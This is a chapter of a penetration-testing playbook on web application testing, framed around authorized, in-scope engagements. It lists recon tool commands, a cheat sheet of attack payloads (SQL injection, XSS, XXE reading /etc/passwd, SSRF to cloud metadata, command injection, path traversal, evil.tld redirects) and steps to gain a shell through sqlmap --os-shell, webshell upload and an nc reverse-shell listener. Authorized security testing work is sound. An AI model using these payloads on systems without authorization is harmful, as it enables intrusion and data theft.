# 10 — Web Application Testing

**Goal:** find and exploit web vulnerabilities on in-scope apps/portals. Internal networks are full of
admin panels, intranet apps, and device web UIs — often the fastest foothold (`06`).

## Map the app
```bash
# Content discovery
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404
feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://<TARGET_IP> -w common.txt -x php,aspx,jsp,txt,bak
# Vhosts / subdomains
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.<DOMAIN>" -w subdomains.txt -fs <baseline-size>
# Tech + quick vuln sweep
whatweb http://<TARGET_IP>;  nuclei -u http://<TARGET_IP>
```
Proxy everything through **Burp** for manual testing.

## High-value checks (internal apps)
- **Default / weak creds** on the login (admin/admin, product defaults).
- **SQL injection** → `sqlmap -r request.txt --batch --dbs` (then `--os-shell` where allowed).
- **Auth bypass / IDOR** — change IDs, force-browse to admin routes.
- **File upload → webshell**, path traversal, LFI/RFI.
- **SSTI / deserialization / command injection** on parameters.
- **Exposed APIs, .git, backups (.bak/.zip), config files, Swagger, actuator endpoints.**
- **SSRF** to reach internal-only services from the app.

## Vulnerability quick-reference (per class)
Proxy through **Burp**; confirm each manually before reporting. One clean, reproduced finding beats a
scanner dump. Test/pointer per class:
```text
SQL injection (SQLi)     ' OR 1=1-- , time-based ' AND SLEEP(5)-- ; sqlmap -r req.txt --batch --dbs [--os-shell]
XSS reflected/stored/DOM  <script>alert(document.domain)</script> ; test in params, headers, DOM sinks
XXE                       <!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]> in XML body ; OOB via ftp/http
SSRF                      point a URL param at http://169.254.169.254/ (cloud metadata) or internal host:port
SSTI                      {{7*7}} / ${7*7} / #{7*7} → engine-specific RCE (Jinja2, Twig, Freemarker, Velocity)
Command injection         ; id | `id` | $(id) | %0aid in params that reach a shell
IDOR / BOLA               increment/replace object IDs (?id=, /users/1002) ; core API finding
Auth bypass (401/403)     path tricks (/admin/. , //admin, %2e), verb tampering, header spoofing (X-Forwarded-For)
Missing func-level access force-browse admin routes as a low-priv/unauth user
Directory traversal / LFI ../../../../etc/passwd , ..%2f , php://filter for source ; RFI if remote include allowed
Arbitrary file read/upload upload webshell (.php/.aspx/.jsp), bypass ext/content-type filters, find upload path
Open redirect             ?next=//evil.tld , ?url=@evil.tld (chains into SSRF/phishing)
Deserialization           Java (ysoserial gadget), .NET (ViewState/BinaryFormatter), PHP (__wakeup) → RCE
CSRF                       state-changing request with no anti-CSRF token / no SameSite
JWT / session             alg:none, weak HMAC secret (hashcat -m 16500), missing exp/verify
Business logic            race conditions, price/quantity tampering, workflow step-skipping
```
Content-discovery + recon feed these: `.git`/`.svn` exposure, backup files (`.bak`,`.old`,`.zip`),
Swagger/OpenAPI, Spring Boot `/actuator`, `web.config`/`.env`, verbose errors, default admin panels.

## Turn web into a shell
- Upload/execute a webshell, or use `sqlmap --os-shell` / xp_cmdshell via a SQLi to MSSQL (`06`).
- Catch reverse shells on `nc -lvnp 443`.

## Evidence to capture
- The request/response proving the vuln (Burp), the payload, and the impact (data returned, shell).
- Root cause (missing input validation, default creds, outdated component) + remediation.

## Pitfalls
- `sqlmap --os-shell`/`--os-pwn` changes the target — confirm it's in scope and log it.
- Don't run destructive payloads on production-like data; prove the vuln without wrecking it.
